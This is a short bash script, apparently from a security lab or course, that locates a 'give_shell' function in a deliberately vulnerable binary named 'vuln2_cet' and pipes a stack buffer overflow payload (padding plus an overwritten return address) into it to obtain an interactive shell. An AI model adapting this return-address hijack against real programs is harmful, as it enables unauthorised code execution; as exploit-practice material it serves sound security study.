#!/bin/bash

echo "objdump -d vuln2_cet | grep give_shell"
objdump -d vuln2_cet | grep give_shell
echo "(python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080491f6)'; cat -) | ./vuln2_cet"
(python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080491f6)'; cat -) | ./vuln2_cet
